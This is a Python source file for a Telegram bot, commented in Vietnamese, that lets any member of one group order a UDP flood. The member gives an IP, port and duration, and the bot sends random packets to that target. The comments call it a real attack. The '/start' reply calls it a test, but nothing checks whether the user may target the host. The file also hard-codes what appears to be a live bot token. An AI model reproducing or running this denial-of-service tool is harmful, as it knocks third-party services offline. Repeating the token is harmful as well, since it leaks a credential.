import telebot
import threading
import time
import socket
import random

# === Cấu hình ===
TOKEN = "8064257148:AAH6DfA-DrE_pS60OBfOj1JsDYOKKdLtmdc"
GROUP_ID = -1002149794790  # Giới hạn bot chỉ dùng được trong group này

bot = telebot.TeleBot(TOKEN)

# === Kiểm tra tin nhắn từ đúng group ===
def is_from_group(message):
    return message.chat.type in ['group', 'supergroup'] and message.chat.id == GROUP_ID

# === Hàm tấn công UDP thật ===
def udp_attack(ip, port, duration):
    timeout = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_data = random._urandom(1024)
    while time.time() < timeout:
        try:
            sock.sendto(bytes_data, (ip, port))
        except:
            pass

# === /start ===
@bot.message_handler(commands=['start'])
def start(message):
    if not is_from_group(message):
        return
    bot.reply_to(message, "Chào bạn! Gửi /attack để thực hiện test UDP.")

# === /myid ===
@bot.message_handler(commands=['myid'])
def myid(message):
    if not is_from_group(message):
        return
    bot.reply_to(message, f"ID của bạn là: `{message.from_user.id}`", parse_mode='Markdown')

# === /attack (ai cũng dùng được trong group) ===
@bot.message_handler(commands=['attack'])
def handle_attack(message):
    if not is_from_group(message):
        return
    bot.reply_to(message, "Nhập theo cú pháp: `ip port thời_gian`\nVí dụ: `1.2.3.4 27015 10`", parse_mode='Markdown')
    bot.register_next_step_handler(message, process_attack)

# === Xử lý tấn công ===
def process_attack(message):
    if not is_from_group(message):
        return
    try:
        ip, port, duration = message.text.split()
        port = int(port)
        duration = int(duration)
        bot.reply_to(message, f"Đang gửi UDP tới {ip}:{port} trong {duration} giây.")
        thread = threading.Thread(target=udp_attack, args=(ip, port, duration))
        thread.start()
    except:
        bot.reply_to(message, "Sai cú pháp. Nhập lại bằng: `ip port thời_gian`")

# === Khởi động bot ===
if __name__ == '__main__':
    print("Bot đang chạy...")
    bot.infinity_polling()
